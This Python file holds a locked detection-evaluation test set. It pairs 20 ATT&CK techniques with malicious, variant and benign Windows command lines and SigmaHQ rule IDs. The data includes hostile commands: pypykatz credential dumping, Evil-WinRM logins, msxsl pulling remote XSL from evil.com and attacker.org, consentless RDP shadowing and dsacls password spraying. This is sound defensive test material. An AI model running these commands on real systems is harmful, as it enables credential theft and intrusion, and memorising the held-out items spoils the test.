"""
Test set 3: 20 new techniques, kept locked as the final clean test set.
Each technique has:
  image        : executable path
  malicious    : shown to the model (like an IOC in a CTI report)
  variant      : hidden from the model, same attack with different arguments
  benign       : hidden, a harmless use of the same program
  variant_type : values (different values) or order_or_prefix (different order or - / prefix)
  rule_file    : SigmaHQ rule file name
  rule_id      : SigmaHQ rule id
"""
import os
import sys

sys.path.insert(0, os.path.dirname(__file__))
from generate import build_event

SYS32 = r"C:\Windows\System32"

TECHNIQUES3 = {
    "T1003.002": {
        "image": r"C:\tools\pypykatz.exe",
        "malicious": r"C:\tools\pypykatz.exe live registry",
        "variant": r"D:\ops\pypykatz.exe live registry",
        "variant_image": r"D:\ops\pypykatz.exe",
        "benign": r"C:\tools\pypykatz.exe live lsa",
        "variant_type": "values",
        "rule_file": "proc_creation_win_hktl_pypykatz.yml",
        "rule_id": "a29808fd-ef50-49ff-9c7a-59a9b040b404",
    },
    "T1021.006": {
        "image": r"C:\Ruby30-x64\bin\ruby.exe",
        "malicious": r"C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -i 10.0.0.1 -u admin -p Password123",
        "variant": r"C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -u admin -p Password123 -i 10.0.0.1",
        "benign": r"C:\Ruby30-x64\bin\ruby.exe test.rb -u admin",
        "variant_type": "order_or_prefix",
        "rule_file": "proc_creation_win_hktl_evil_winrm.yml",
        "rule_id": "a197e378-d31b-41c0-9635-cfdf1c1bb423",
    },
    "T1040": {
        "image": r"C:\Program Files\Wireshark\tshark.exe",
        "malicious": r"C:\Program Files\Wireshark\tshark.exe -i 1 -w C:\temp\sniff.pcap",
        "variant": r"C:\Program Files\Wireshark\tshark.exe -i 2 -w C:\Users\Public\capture.pcap",
        "benign": r"C:\Program Files\Wireshark\tshark.exe -D",
        "variant_type": "values",
        "rule_file": "proc_creation_win_susp_network_sniffing.yml",
        "rule_id": "ba1f7802-adc7-48b4-9ecb-81e227fddfd5",
    },
    "T1053.002": {
        "image": rf"{SYS32}\at.exe",
        "malicious": rf"{SYS32}\at.exe 12:00 /interactive cmd.exe",
        "variant": rf"{SYS32}\at.exe 23:15 /interactive cmd.exe",
        "benign": rf"{SYS32}\at.exe 12:00 cmd.exe",
        "variant_type": "values",
        "rule_file": "proc_creation_win_at_interactive_execution.yml",
        "rule_id": "60fc936d-2eb0-4543-8a13-911c750a1dfc",
    },
    "T1082": {
        "image": r"C:\Program Files\DTrace\dtrace.exe",
        "malicious": r'C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"',
        "variant": r'C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w',
        "benign": r"C:\Program Files\DTrace\dtrace.exe -l",
        "variant_type": "order_or_prefix",
        "rule_file": "proc_creation_win_dtrace_kernel_dump.yml",
        "rule_id": "7124aebe-4cd7-4ccb-8df0-6d6b93c96795",
    },
    "T1112": {
        "image": r"C:\Program Files\Oracle\VirtualBox\VBoxDrvInst.exe",
        "malicious": r"C:\Program Files\Oracle\VirtualBox\VBoxDrvInst.exe driver executeinf C:\temp\vbox.inf",
        "variant": r"C:\Program Files\Oracle\VirtualBox\VBoxDrvInst.exe driver executeinf C:\Users\Public\driver.inf",
        "benign": r"C:\Program Files\Oracle\VirtualBox\VBoxDrvInst.exe --help",
        "variant_type": "values",
        "rule_file": "proc_creation_win_virtualbox_vboxdrvinst_execution.yml",
        "rule_id": "b7b19cb6-9b32-4fc4-a108-73f19acfe262",
    },
    "T1113": {
        "image": rf"{SYS32}\Psr.exe",
        "malicious": rf"{SYS32}\Psr.exe /start /output C:\temp\screen.zip",
        "variant": rf"{SYS32}\Psr.exe /output C:\temp\screen.zip /start",
        "benign": rf"{SYS32}\Psr.exe /stop",
        "variant_type": "order_or_prefix",
        "rule_file": "proc_creation_win_psr_capture_screenshots.yml",
        "rule_id": "2158f96f-43c2-43cb-952a-ab4580f32382",
    },
    "T1123": {
        "image": rf"{SYS32}\SoundRecorder.exe",
        "malicious": rf"{SYS32}\SoundRecorder.exe /FILE C:\temp\recording.wav",
        "variant": rf"{SYS32}\SoundRecorder.exe /FILE C:\Users\Public\audio.wav",
        "benign": rf"{SYS32}\SoundRecorder.exe",
        "variant_type": "values",
        "rule_file": "proc_creation_win_soundrecorder_audio_capture.yml",
        "rule_id": "83865853-59aa-449e-9600-74b9d89a6d6e",
    },
    "T1176.001": {
        "image": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        "malicious": r'C:\Program Files\Google\Chrome\Application\chrome.exe --load-extension="C:\temp\myext"',
        "variant": r'C:\Program Files\Google\Chrome\Application\chrome.exe --load-extension="C:\Users\Public\ext"',
        "benign": r"C:\Program Files\Google\Chrome\Application\chrome.exe https://google.com",
        "variant_type": "values",
        "rule_file": "proc_creation_win_browsers_chromium_load_extension.yml",
        "rule_id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
    },
    "T1185": {
        "image": r"C:\Program Files\Mozilla Firefox\firefox.exe",
        "malicious": r"C:\Program Files\Mozilla Firefox\firefox.exe -start-debugger-server 6000",
        "variant": r"C:\Program Files\Mozilla Firefox\firefox.exe -start-debugger-server 9222",
        "benign": r"C:\Program Files\Mozilla Firefox\firefox.exe https://mozilla.org",
        "variant_type": "values",
        "rule_file": "proc_creation_win_browsers_remote_debugging.yml",
        "rule_id": "b3d34dc5-2efd-4ae3-845f-8ec14921f449",
    },
    "T1202": {
        "image": rf"{SYS32}\Runscripthelper.exe",
        "malicious": rf"{SYS32}\Runscripthelper.exe surfacecheck C:\temp\payload.txt",
        "variant": rf"{SYS32}\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt",
        "benign": rf"{SYS32}\Runscripthelper.exe /?",
        "variant_type": "values",
        "rule_file": "proc_creation_win_lolbin_runscripthelper.yml",
        "rule_id": "eca49c87-8a75-4f13-9c73-a5a29e845f03",
    },
    "T1218": {
        "image": rf"{SYS32}\dsacls.exe",
        "malicious": rf'{SYS32}\dsacls.exe "CN=Users,DC=lab,DC=local" /user:svc01 /passwd:Spring2026',
        "variant": rf'{SYS32}\dsacls.exe "CN=Computers,DC=corp,DC=example" /user:backup /passwd:Autumn2025',
        "benign": rf'{SYS32}\dsacls.exe "CN=Users,DC=lab,DC=local"',
        "variant_type": "values",
        "rule_file": "proc_creation_win_dsacls_password_spray.yml",
        "rule_id": "bac9fb54-2da7-44e9-988f-11e9a5edbc0c",
    },
    "T1219.002": {
        "image": r"C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe",
        "malicious": r'C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe -register -code "code1" -id "id1" -region "us-east-1"',
        "variant": r'C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe -register -region "us-east-1" -id "id1" -code "code1"',
        "benign": r"C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe -version",
        "variant_type": "order_or_prefix",
        "rule_file": "proc_creation_win_ssm_agent_abuse.yml",
        "rule_id": "d20ee2f4-822c-4827-9e15-41500b1fff10",
    },
    "T1220": {
        "image": r"C:\Windows\msxsl.exe",
        "malicious": r"C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl",
        "variant": r"C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl",
        "benign": r"C:\Windows\msxsl.exe C:\temp\data.xml C:\temp\sheet.xsl",
        "variant_type": "values",
        "rule_file": "proc_creation_win_msxsl_remote_execution.yml",
        "rule_id": "75d0a94e-6252-448d-a7be-d953dff527bb",
    },
    "T1529": {
        "image": rf"{SYS32}\shutdown.exe",
        "malicious": rf"{SYS32}\shutdown.exe /r /t 0",
        "variant": rf"{SYS32}\shutdown.exe /r /t 30",
        "benign": rf"{SYS32}\shutdown.exe /a",
        "variant_type": "values",
        "rule_file": "proc_creation_win_shutdown_execution.yml",
        "rule_id": "34ebb878-1b15-4895-b352-ca2eeb99b274",
    },
    "T1563.002": {
        "image": rf"{SYS32}\mstsc.exe",
        "malicious": rf"{SYS32}\mstsc.exe /v:10.0.0.5 /shadow:2 /noconsentprompt",
        "variant": rf"{SYS32}\mstsc.exe /noconsentprompt /shadow:2 /v:10.0.0.5",
        "benign": rf"{SYS32}\mstsc.exe /v:10.0.0.5",
        "variant_type": "order_or_prefix",
        "rule_file": "proc_creation_win_mstsc_rdp_hijack_shadowing.yml",
        "rule_id": "6ba5a05f-b095-4f0a-8654-b825f4f16334",
    },
    "T1564.004": {
        "image": rf"{SYS32}\spool\tools\PrintBrm.exe",
        "malicious": rf"{SYS32}\spool\tools\PrintBrm.exe -b -f C:\temp\backup.zip",
        "variant": rf"{SYS32}\spool\tools\PrintBrm.exe -f C:\temp\backup.zip -b",
        "benign": rf"{SYS32}\spool\tools\PrintBrm.exe -?",
        "variant_type": "order_or_prefix",
        "rule_file": "proc_creation_win_lolbin_printbrm.yml",
        "rule_id": "cafeeba3-01da-4ab4-b6c4-a31b1d9730c7",
    },
    "T1572": {
        "image": rf"{SYS32}\OpenSSH\ssh.exe",
        "malicious": rf"{SYS32}\OpenSSH\ssh.exe -R 8080:localhost:80 user@10.0.0.1",
        "variant": rf"{SYS32}\OpenSSH\ssh.exe user@10.0.0.1 -R 8080:localhost:80",
        "benign": rf"{SYS32}\OpenSSH\ssh.exe user@10.0.0.1",
        "variant_type": "order_or_prefix",
        "rule_file": "proc_creation_win_ssh_port_forward.yml",
        "rule_id": "327f48c1-a6db-4eb8-875a-f6981f1b0183",
    },
    "T1574": {
        "image": rf"{SYS32}\register-cimprovider.exe",
        "malicious": rf"{SYS32}\register-cimprovider.exe -path C:\temp\evil.dll",
        "variant": rf"{SYS32}\register-cimprovider.exe -path C:\Users\Public\payload.dll",
        "benign": rf"{SYS32}\register-cimprovider.exe /?",
        "variant_type": "values",
        "rule_file": "proc_creation_win_registry_cimprovider_dll_load.yml",
        "rule_id": "76de9e01-11d6-444a-9aa2-cb920ef0f6cc",
    },
    "T1615": {
        "image": rf"{SYS32}\gpresult.exe",
        "malicious": rf"{SYS32}\gpresult.exe /z /user admin",
        "variant": rf"{SYS32}\gpresult.exe /user admin /z",
        "benign": rf"{SYS32}\gpresult.exe /?",
        "variant_type": "order_or_prefix",
        "rule_file": "proc_creation_win_gpresult_execution.yml",
        "rule_id": "e56d3073-83ff-4021-90fe-c658e0709e72",
    },
}

DESCRIPTIONS3 = {
    "T1003.002": "An attacker dumps credentials from the SAM registry hive using pypykatz.",
    "T1021.006": "An attacker establishes a remote WinRM session using Evil-WinRM.",
    "T1040": "An attacker captures network traffic on a network interface using tshark.",
    "T1053.002": "An attacker schedules an interactive command prompt job using at.",
    "T1082": "An attacker dumps live kernel memory using DTrace.",
    "T1112": "An attacker installs an arbitrary driver INF using VirtualBox driver installer.",
    "T1113": "An attacker records screen activity and user interactions using Problem Steps Recorder.",
    "T1123": "An attacker records audio from the microphone using Windows Sound Recorder.",
    "T1176.001": "An attacker launches a Chromium browser with an unpacked custom extension.",
    "T1185": "An attacker launches Firefox with a remote debugging server enabled.",
    "T1202": "An attacker executes an arbitrary script using the Runscripthelper utility.",
    "T1218": "An attacker tries passwords against a domain account using dsacls.",
    "T1219.002": "An attacker registers an unauthorized machine with an Amazon SSM agent.",
    "T1220": "An attacker executes remote XSL transformation scripts using msxsl.",
    "T1529": "An attacker initiates an immediate system reboot using shutdown.",
    "T1563.002": "An attacker views another user's remote desktop session without asking for consent, using mstsc.",
    "T1564.004": "An attacker creates a printer backup zip file using PrintBrm.",
    "T1572": "An attacker sets up a reverse port forwarding tunnel using OpenSSH.",
    "T1574": "An attacker loads an arbitrary DLL using the Register-cimprovider utility.",
    "T1615": "An attacker inspects applied Group Policy settings using gpresult.",
}


def make_triple3(tech):
    t = TECHNIQUES3[tech]
    variant_image = t.get("variant_image", t["image"])
    return (
        build_event(t["image"], t["malicious"]),
        build_event(variant_image, t["variant"]),
        build_event(t["image"], t["benign"]),
    )
